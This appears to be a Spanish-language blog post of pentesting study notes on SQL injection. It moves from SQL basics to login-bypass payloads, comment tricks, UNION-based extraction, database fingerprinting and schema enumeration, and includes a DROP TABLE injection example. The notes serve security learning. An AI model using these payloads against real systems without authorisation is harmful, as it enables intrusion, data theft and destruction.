---
title: SQL Injection
date: 2025-10-13 11:00:00 +0000
categories: [Web, apuntes]
tags: [pentesting, web, SQLi]
image:
  path: /assets/img/posts/sql-injection/banner.png
  alt: cabecera
description: >
   SQL Injection

pin: false  
toc: true   
math: false 
mermaid: false 
---


Cuando la información proporcionada por el usuario se utiliza para construir la consulta a la base de datos, pueden engañar a la consulta para que se utilice para algo distinto de lo que pretendía el programador original, lo que proporciona al usuario acceso para consultar la base de datos mediante un ataque conocido como inyección SQL (SQLi).

La inyección SQL se refiere a los ataques contra bases de datos relacionales como MySQL (mientras que las inyecciones contra bases de datos no relacionales, como MongoDB, se denominan inyecciones NoSQL).


### Arquitectura

![image](/assets/img/posts/sql-injection/20251013111742.png)
El nivel I suele estar formado por aplicaciones del lado del cliente, como sitios web o programas GUI.

Estas aplicaciones consisten en interacciones de alto nivel, como el inicio de sesión del usuario o la publicación de comentarios. Los datos de estas interacciones se transmiten al nivel II a través de llamadas API u otras solicitudes.

El segundo nivel es el middleware, que interpreta estos eventos y los convierte al formato requerido por el DBMS. 

Por último, la capa de aplicación utiliza bibliotecas y controladores específicos basados en el tipo de DBMS para interactuar con ellos. El DBMS recibe consultas del segundo nivel y realiza las operaciones solicitadas. Estas operaciones pueden incluir la inserción, recuperación, eliminación o actualización de datos. Después del procesamiento, el DBMS devuelve los datos solicitados o los códigos de error en caso de consultas no válidas.


Es posible alojar el servidor de aplicaciones y el DBMS en el mismo host. Sin embargo, las bases de datos con grandes cantidades de datos que dan soporte a muchos usuarios suelen alojarse por separado para mejorar el rendimiento y la escalabilidad.


#### Bases de datos relacionales

Es el tipo más común de base de datos y aunque a día de hoy muchas organinzaciones la utilizan debido a su estrutura y facilidad para organizar los datos de forma limpia, en sus inicios fue únicamente utilizada por grandes organizaciones.

Su concepto recae en la relación de datos a través de "llaves" o "key values".

Primero tenemos las tablas donde almacenamos por ejemplo los usuarios. Estos usuarios además de sus datos tienen una primera columna "id" que los ordena y hace rápidamente direccionables dentro de la tabla. Este valor id es el que normalmente se establece como "key" para que así podamos vincularlo a otra tabla que por ejemplo guarde posts. 

Esta tabla de posts en lugar de almacenar todos los datos de cada usuario que la ha creado, guarda un valor "user_id" que vincula la tabla usuarios con la tabla posts.

Cada tabla puede tener más de un "key_value" para que este se pueda vincular a otra tabla y así sucesivamente.

Esta interconexión se denomina esquema "schema" y es lo que define la estructura de datos finalmente.

Gracias a esta estructura es que se pueden ordenar y extraer datos de forma sencilla y rápida.

#### Bases de datos no relacionales

Comúnmente denominadas NoSQL son bases de datos más flexibles y escalables.

Existen diferentes tipos pero las más fáciles de ver son las organizadas por key-value en XML o JSON.

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```


### SQL

La sintaxis entre RDBMS puede tener algunos cambios pero todos deben seguir un estandar SQL.

- Recuperar datos.

- Actualizar datos.

- Eliminar datos.

- Crear nuevas tablas y bases de datos.

- Añadir/eliminar usuarios.

- Asignar permisos a estos usuarios.


#### CLI

La utilidad mysql  CLI se utiliza para autenticarse e interactuar con una base de datos MySQL/MariaDB. 

El indicador -u se utiliza para proporcionar el nombre de usuario y el indicador -p para la contraseña. 

El indicador -p debe pasarse vacío, de modo que se nos pida que introduzcamos la contraseña y no la pasemos directamente en la línea de comandos, ya que podría almacenarse en texto claro en el archivo bash_history.

```shell-session
$ mysql -u root -p

Enter password: <password>
...SNIP...

mysql> 
```

##### Crear una base de datos

```shell-session
mysql> CREATE DATABASE users;

Query OK, 1 row affected (0.02 sec)
```

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

mysql> USE users;

Database changed
```


> [!NOTE] 
> Las sentencias SQL como "USE" no son case sensitive, es decir no se ven afectadas si se escriben en mayúsculas o minúsculas pero los nombres de las tablas o bases de datos si son afectadas.


##### Tablas

Un tipo de datos define qué tipo de valor debe contener una columna. Algunos ejemplos comunes son números, cadenas, fechas, horas y datos binarios. 
También puede haber tipos de datos específicos de DBMS. 

[Lista completa de los tipos de datos en MySQL.](https://dev.mysql.com/doc/refman/8.0/en/data-types.html)

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

```shell-session
mysql> SHOW TABLES;

+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
1 row in set (0.00 sec)
```

La palabra clave DESCRIBE se utiliza para enumerar la estructura de la tabla con sus campos y tipos de datos.

```shell-session
mysql> DESCRIBE logins;

+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)
```

##### Propiedades de las tablas

Cuando creamos una tabla con sus correspondientes datos podemos asignar diversas propiedades a estos.

Por ejemplo en el valor entero "id" lo normal es asignar la propiedad AUTO_INCREMENT, haciendo que cada vez que se cree una nueva entrada este no es nulo ya que esencialmente no se pasa ningun valor id o no deberíamos, este se auto incrementa en 1 al crear una nueva fila.

```sql
   id INT NOT NULL AUTO_INCREMENT,
```

El "not null" indica que nunca debe ser nulo o quedar vacío. También se puede asignar el valor "unique" que solo permite que exista un valor igual a ese en la tabla, por ejemplo si queremos que no se repitan los nombres de usuario.

```sql
  username VARCHAR(100) UNIQUE NOT NULL,
```

El parámetro "DEFAULT" se usa para especificar el valor asignado a la casilla por defecto. Por ejemplo en el valor "date_of_joining" se establece para que cuando se cree esta entrada tome el valor actual de la fecha.

```sql
    date_of_joining DATETIME DEFAULT NOW(),
```

Ahora el parámetro más importante o lo que realmente hace SQL una base de datos relacional es el "PRIMARY KEY".

Se usa para designar cual de los valores en la tabla será la "llave" de la que hablamos antes, la cual nos permitirá relacionar datos entre tablas. 

En este caso el id será la llave primaria.

```sql
    PRIMARY KEY (id)
```

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```


#### Sentencias SQL

##### INSERT

```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

```shell-session
mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');

Query OK, 1 row affected (0.00 sec)
```

En este ejemplo se introducen los valores id y date_of_joining pero realmente no son necesarios ya que anteriormente indicamos que se establecen automáticamente.

```sql
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```

```shell-session
mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');

Query OK, 1 row affected (0.00 sec)
```

También se pueden insertar multiples datos;

```shell-session
mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');

Query OK, 2 rows affected (0.00 sec)
Records: 2  Duplicates: 0  Warnings: 0
```

##### SELECT

```sql
SELECT * FROM table_name;
```

En este caso el uso principal es recuperar los datos de una de las tablas. Si usamos el comodin * siginifca todo.

```sql
SELECT column1, column2 FROM table_name;
```

```shell-session
mysql> SELECT * FROM logins;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)


mysql> SELECT username,password FROM logins;

+---------------+------------+
| username      | password   |
+---------------+------------+
| admin         | p@ssw0rd   |
| administrator | adm1n_p@ss |
| john          | john123!   |
| tom           | tom123!    |
+---------------+------------+
4 rows in set (0.00 sec)
```


##### DROP

Se usa para eliminar tablas o bases de datos.

```shell-session
mysql> DROP TABLE logins;

Query OK, 0 rows affected (0.01 sec)


mysql> SHOW TABLES;

Empty set (0.00 sec)
```


> [!NOTE] 
> Esta sentencia elimina todos los datos permanentemente y sin pregunta previa de si estamos seguros


##### ALTER

Sirve para cambiar el nombre de cualquier tabla o sus campos. También para añadir o eliminar columnas.

```shell-session
mysql> ALTER TABLE logins ADD newColumn INT;

Query OK, 0 rows affected (0.01 sec)
```
```shell-session
mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;

Query OK, 0 rows affected (0.01 sec)
```
```shell-session
mysql> ALTER TABLE logins MODIFY newerColumn DATE;

Query OK, 0 rows affected (0.01 sec)
```
```shell-session
mysql> ALTER TABLE logins DROP newerColumn;

Query OK, 0 rows affected (0.01 sec)
```


##### UPDATE

A difrencia de ALTER que sirve para modificar las propiedades de las tablas, UPDATE se utiliza para modificar el contenido de las casillas en función de ciertas condiciones.

```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

```shell-session
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;

Query OK, 3 rows affected (0.00 sec)
Rows matched: 3  Changed: 3  Warnings: 0


mysql> SELECT * FROM logins;

+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:47:16 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```

#### Orden de los resultados

```shell-session
mysql> SELECT * FROM logins ORDER BY password;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

Por defecto el orden es ascendente pero se puede modificar;

```shell-session
mysql> SELECT * FROM logins ORDER BY password DESC;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;

+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:50:20 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```


##### Limitar resultados

```shell-session
mysql> SELECT * FROM logins LIMIT 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

Si quisiéramos LIMITAR los resultados con un desplazamiento, podríamos especificar el desplazamiento antes del recuento LIMIT;

```shell-session
mysql> SELECT * FROM logins LIMIT 1, 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

El desplazamiento marca el orden del primer registro que se incluirá, comenzando por 0. En el caso anterior, comienza e incluye el segundo registro, y devuelve dos valores.

##### WHERE

```sql
SELECT * FROM table_name WHERE <condition>;
```

```shell-session
mysql> SELECT * FROM logins WHERE id > 1;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
3 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM logins where username = 'admin';

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

Los tipos de datos string y fecha deben ir entre comillas simples (') o comillas dobles ("), mientras que los números se pueden utilizar directamente.


##### LIKE

```shell-session
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

El símbolo % actúa como comodín y coincide con todos los caracteres que siguen a admin. Se utiliza para coincidir con cero o más caracteres. 
Del mismo modo, el símbolo _ se utiliza para coincidir exactamente con un carácter. La siguiente consulta coincide con todos los nombres de usuario que contienen exactamente tres caracteres, que en este caso era tom;

```shell-session
mysql> SELECT * FROM logins WHERE username like '___';

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
+----+----------+----------+---------------------+
1 row in set (0.01 sec)
```


### Operadores SQL

#### AND 

```sql
condition1 AND condition2
```

El resultado es verdadero cuando ambos condicionales son ciertos.

```shell-session
mysql> SELECT 1 = 1 AND 'test' = 'test';

+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|                         1 |
+---------------------------+
1 row in set (0.00 sec)

mysql> SELECT 1 = 1 AND 'test' = 'abc';

+--------------------------+
| 1 = 1 AND 'test' = 'abc' |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set (0.00 sec)
```

En términos de MySQL, cualquier valor distinto de cero se considera verdadero y, por lo general, devuelve el valor 1 para indicar que es verdadero. El 0 se considera falso. 

Como podemos ver en el ejemplo anterior, la primera consulta devolvió verdadero, ya que ambas expresiones se evaluaron como verdaderas. Sin embargo, la segunda consulta devolvió falso, ya que la segunda condición «test» = «abc» es falsa.

#### OR

Evalua dos condicionales y retorna verdadero si cualquiera de las dos es verdadero.

```shell-session
mysql> SELECT 1 = 1 OR 'test' = 'abc';

+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set (0.00 sec)

mysql> SELECT 1 = 2 OR 'test' = 'abc';

+-------------------------+
| 1 = 2 OR 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set (0.00 sec)
```


#### NOT

Convierte un el resultado de un condicional en lo contrario.

```shell-session
mysql> SELECT NOT 1 = 1;

+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |
+-----------+
1 row in set (0.00 sec)

mysql> SELECT NOT 1 = 2;

+-----------+
| NOT 1 = 2 |
+-----------+
|         1 |
+-----------+
1 row in set (0.00 sec)
```

La primera consulta dio como resultado falso porque es la inversa de la evaluación de 1 = 1, que es verdadera, por lo que su inversa es falsa. 

Por otro lado, la segunda consulta devolvió verdadero, ya que la inversa de 1 = 2 «que es falsa» es verdadera.


#### Simbolos de los operadores

Los operadores AND, OR y NOT también se pueden representar como &&, || y !, respectivamente. 

```shell-session
mysql> SELECT 1 = 1 && 'test' = 'abc';

+-------------------------+
| 1 = 1 && 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)

mysql> SELECT 1 = 1 || 'test' = 'abc';

+-------------------------+
| 1 = 1 || 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)

mysql> SELECT 1 != 1;

+--------+
| 1 != 1 |
+--------+
|      0 |
+--------+
1 row in set (0.00 sec)
```


```shell-session
mysql> SELECT * FROM logins WHERE username != 'john';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
3 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

#### Uso de múltiples operadores

SQL admite otras operaciones diversas, como la suma, la división y las operaciones bit a bit. Por lo tanto, una consulta puede tener varias expresiones con múltiples operaciones a la vez. El orden de estas operaciones se decide mediante la precedencia de los operadores.

- División (/), multiplicación (*) y módulo (%)

- Suma (+) y resta (-)

- Comparación (=, >, <, <=, >=, !=, LIKE)

- NOT (!)

- AND (&&)

- OR (||)

Las operaciones en la parte superior se evalúan antes que las que se encuentran en la parte inferior de la lista.

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

La consulta tiene cuatro operaciones: !=, AND, > y -. Por la precedencia de los operadores, sabemos que la resta es lo primero, por lo que primero se evaluará 3 - 2 como 1.

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```

A continuación, tenemos dos operaciones de comparación, > y !=. Ambas tienen la misma prioridad y se evaluarán juntas. Por lo tanto, devolverá todos los registros en los que el nombre de usuario no sea tom y todos los registros en los que el id sea mayor que 1, y luego aplicará AND para devolver todos los registros que cumplan ambas condiciones.

```shell-session
mysql> select * from logins where username != 'tom' AND id > 3 - 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-03 12:03:53 |
|  3 | john          | john123!   | 2020-07-03 12:03:57 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```


### Uso en aplicaciones web

#### PHP 

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

El output es guardado en $result y podemos mostrarlo de forma ordenada;

```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

Normalmente se utiliza el input del usuario para devolver datos, por ejemplo; 

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

#### ¿De que trata el SQLi?

Por ejemplo en la consulta anterior estamos pasando el input del usuario de forma directa, sin tener en cuenta ningún tipo de sanitización de la entrada. 

Esto provoca que cuando se introduzcan datos de formados de manera que escapen los carácteres que limitan la variable, se puedan inyectar consultas adicionales en la query y devolver datos que no deberían ser mostrados.

Por lo tanto, si introducimos «admin», se convierte en «%admin». 
En este caso, si escribimos cualquier código SQL, se consideraría simplemente como un término de búsqueda. Por ejemplo, si introducimos SHOW DATABASES;, se ejecutaría como «%SHOW DATABASES;». 

La aplicación web buscará nombres de usuario similares a SHOW DATABASES;. Sin embargo, como no hay sanitización, en este caso podemos añadir una comilla simple (“), que terminará el campo de entrada del usuario, y después de ella podemos escribir el código SQL real. 

Por ejemplo, si buscamos «1'; DROP TABLE users;», la entrada de búsqueda sería;

```php
'%1'; DROP TABLE users;'
```
```sql
select * from logins where username like '%1'; DROP TABLE users;'
```


> [!NOTE] 
> En el ejemplo anterior, para simplificar, hemos añadido otra consulta SQL después de un punto y coma (;). Aunque esto no es posible con MySQL, sí lo es con MSSQL y PostgreSQL.


#### Syntax Errors

Si ejecutasemos el ejemplo anterior este devolvería;

```php
Error: near line 1: near "'": syntax error
```

Esto es porque la consulta que inyectamos está contenida entre ''.

Existen diferentes técnicas para hacer que este último caracter no se tome como tal, por ejemplo indicando que es un comentario con los carácteres -- aunque esto depende de la DBMS.

#### Tipos de inyecciones SQL

![image](/assets/img/posts/sql-injection/20251013142321.png)

- In-band:
Es cuando el contenido de la query es posible visualizarlo directamente en el frontend, es decir que los datos son mostrados directamente en la web o respuesta.

Este tipo de inyección tiene a su vez dos tipos:

	- Union based:
En la que se tiene que especificar la localización exacta de los      datos que queremos extraer.

	- Error based:
Se usa para extraer los mensajes de error en PHP o SQL       directamente en el frontend, de forma que podemos provocar un error intencionado que nos devuelva el contenido de una consulta.

- Blind:
En casos mas complejos no se obtiene ningún tipo de salida por lo que se puede usar la lógica SQL para extraer los datos caracter por caracter.

	- Boolean based:
Podemos utilizar sentencias condicionales SQL para controlar si la página devuelve algún resultado, es decir, la respuesta original a la consulta, si nuestra sentencia condicional devuelve verdadero.

	- Time based:
Utilizamos sentencias condicionales SQL que retrasan la respuesta de la página si la sentencia condicional devuelve verdadero utilizando la función Sleep().


- Out of band:

En algunos casos, es posible que no tengamos acceso directo a la salida, por lo que tendremos que dirigirla a una ubicación remota, es decir, un registro DNS, y luego intentar recuperarla desde allí. Esto se conoce como inyección SQL fuera de banda.


### SQL Inyection

#### SQLi Discovery

Antes de intentar inyectar sentencias lo más últil es comprobar con un payload sencillo si la aplicación es vulnerable a inyecciones sql por ejemplo con los siguientes carácteres.

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

Cuando el parámetro es pasado por URL  mediante GET lo más usual es tener que usar el URL Enconded.

#### OR Injection

Para hacer un bypass de login debemos hacer que la consulta devuelva siempre el estado true. Para ello podemos abusar del operador OR.

De esta manera si inyectamos un operador OR que indique por ejemplo 1 = 1, como ese condicional siempre será verdadero independientemente de lo que se introduzca como usuario o contraseña, la consulta devuelve true y se inicia sesión con el primer usuario de la tabla correspondiente.


```sql
admin' or '1'='1
```

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

![image](/assets/img/posts/sql-injection/20251013144708.png)
En este caso como estamos especificando el nombre de usuario admin, solo se inicia sesión si este existe en la tabla de usuarios ya que es el unico condicional del que finalmente depende la consulta.

> [!NOTE] 
> El paylaod utilizado anteriormente es uno de los muchos disponibles para bypass de autenticación que podemos utilizar. En [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) podemos encontrar multitud, cada una de las cuales funciona con un tipo concreto de consultas SQL.


Por ejemplo si modificamos el nombre de usuario a uno que no existe;

![image](/assets/img/posts/sql-injection/20251013145312.png)

La consulta será falsa y el login fallido.

Si queremos hacer el bypass completo independientemente del usuario o contraseña tenemos que inyectar dos operadors OR donde en cada uno pongamos una condición que siempre sea verdadera.

![image](/assets/img/posts/sql-injection/20251013145536.png)

De esta forma es cuando se hace bypass completo del login y el usuario con el que se inicia sesión es el primero en la tabla de usuarios.

##### Bypass con comentarios

Al igual que cualquier otro lenguaje, SQL también permite el uso de comentarios. Los comentarios se utilizan para documentar consultas o ignorar una parte determinada de la consulta. 

En MySQL podemos utilizar dos tipos de comentarios de línea: -- y #, además de un comentario en línea `/**/` (aunque este no se suele utilizar en las inyecciones SQL).

```shell-session
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```


> [!NOTE] 
> En SQL, no basta con usar dos guiones para iniciar un comentario. Es necesario dejar un espacio en blanco después de ellos, de modo que el comentario comience con (-- ) y termine con un espacio. A veces, esto se codifica como URL (--+), ya que los espacios en las URL se codifican como (+). Para que quede claro, añadiremos otro (-) al final (-- -), para mostrar el uso del carácter de espacio.

```shell-session
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

Este tipo de inyección es útil cuando por ejemplo tenemos una sentencia que impide usar el username admin como la siguiente;

![image](/assets/img/posts/sql-injection/20251013152533.png)

En este caso impide el inicio de sesión ya que el id debe ser superior a 1 y el de admin es 1.

Para hacer el bypass podemos cerrar el paréntesis y comentar el resto.

![image](/assets/img/posts/sql-injection/20251013152635.png)

#### Sentencia UNION

Esta sentencia se usa para combinar resultados de diferentes sentencias SELECT. 
Con esta sentencia podemos extraer datos de las diferentes bases de datos, tablas, etc...

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

##### Columnas iguales

Las sentencias UNION solo se pueden utilizar con las sentencias SELECT en tablas con el mismo número de columnas. 
Si intentamos hacer un union de dos tablas con diferentes columnas esto nos dará error.

```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

De esta manera solo podemos extraer datos de tablas con el mismo número de columnas o extaer datos de x columnas tantas como la tabla base tenga, por ejemplo;

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

Asumiendo que la tabla products tiene 2 columnas, solo podremos extraer 2 columnas de la tabla passwords.

##### Columnas desiguales.

Normalmente las tablas no suelen tener el mismo número de columnas por lo que para poder extraer datos completos usando UNION vamos a tener que introducir datos vacíos o "junk data" para que las columnas coincidan entre tablas.


> [!NOTE] 
> Al rellenar otras columnas con datos basura, debemos asegurarnos de que el tipo de datos coincida con el tipo de datos de las columnas, de lo contrario la consulta devolverá un error. Para simplificar, utilizaremos números como datos basura, lo que también resultará útil para rastrear las posiciones de nuestros payloads.
> Para inyecciones más avanzadas lo mejor es usar 'NULL' ya que este valor es válido para todos los tipos de datos.


```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```


#### Inyección con UNION

Vamos a suponer que tenemos un parámetro de busqueda vulnerable a SQLi.

![image](/assets/img/posts/sql-injection/20251013155028.png)

#### Detectar el número de columnas

- Usando ORDER BY

Por ejemplo, podemos empezar con el orden por 1, ordenar por la primera columna y tener éxito, ya que la tabla debe tener al menos una columna. A continuación, ordenaremos por 2 y luego por 3 hasta que lleguemos a un número que devuelva un error, o la página no muestre ningún resultado, lo que significa que ese número de columna no existe. La última columna que hayamos ordenado con éxito nos da el número total de columnas.

Si fallamos en el orden por 4, esto significa que la tabla tiene tres columnas, que es el número de columnas que pudimos ordenar con éxito.

```sql
' order by 1-- -
```

- Usando UNION

El otro método consiste en intentar una inyección Union con un número diferente de columnas hasta que obtengamos los resultados correctamente. El primer método siempre devuelve los resultados hasta que se produce un error, mientras que este método siempre da un error hasta que se obtiene un resultado satisfactorio. 

```sql
cn' UNION select 1,2,3-- -
```


#### Posición de la inyección

Tenemos que tener en cuenta la posición donde queremos que se nos devuelvan los datos inyectados ya que si por ejemplo los ponemos en la columna 1 y esta no se muestra en la salida no los podremos ver.

![image](/assets/img/posts/sql-injection/20251013160442.png)

Por lo tanto para mover la inyección tenemos que hacer lo siguiente:

```sql
cn' UNION select 1,@@version,3,4-- -
```

![image](/assets/img/posts/sql-injection/20251013160536.png)


### Explotación

#### Reconocimiento

Antes de proceder con la enumeración es necesario identificar el tipo de base de datos ya que cada una dispondrá de un tipo de comandos o sentencias algo diferentes.

Inicialmente podemos tener en cuenta que si el servicio se ejecuta bajo apache o nginx, será un servidor linux y por detrás tendrá MySQL/MariaDB. Sin embargo si el servidor web es IIS de microsoft, lo más seguro es que la base de datos sea MSSQL.

A pesar de que es lo normal no siempre es así.

#### MySQL 

|**Payload**|**Cuándo usarlo**|**Salida esperada**|**Salida incorrecta**|
|---|---|---|---|
|`SELECT @@version`|Cuando tenemos salida completa de la consulta|Versión de MySQL, por ejemplo: `'10.3.22-MariaDB-1ubuntu1'`|En MSSQL devuelve la versión de MSSQL. Genera error con otros sistemas de bases de datos.|
|`SELECT POW(1,1)`|Cuando solo tenemos salida numérica|`1`|Genera error con otros sistemas de bases de datos.|
|`SELECT SLEEP(5)`|En casos _blind_ (sin salida visible) o sin salida|Retrasa la respuesta de la página por 5 segundos y devuelve `0`.|No retrasará la respuesta en otros sistemas de bases de datos.|
##### INFORMATION_SCHEMA

Para formar las consultas UNION correctamente necesitamos la siguiente información:

- Lista de las bases de datos
- Lista de las tablas en cada base de datos
- Lista de columnas dentro de cada tabla

Para ello podemos hacer una consulta al esquema de la base de datos, que contiene estos metadatos sobre las bases de datos y tablas dentro del DBMS.

Esto nos permite saber por ejemplo donde se encuentra la tabla users ya que si esta se encuentra dentro de otra base de datos, para poder referenciarla debemos indicar el nombre de esta base de datos donde se encuentra y luego el nombre de la tabla.

```sql
SELECT * FROM my_database.users;
```

##### SCHEMATA

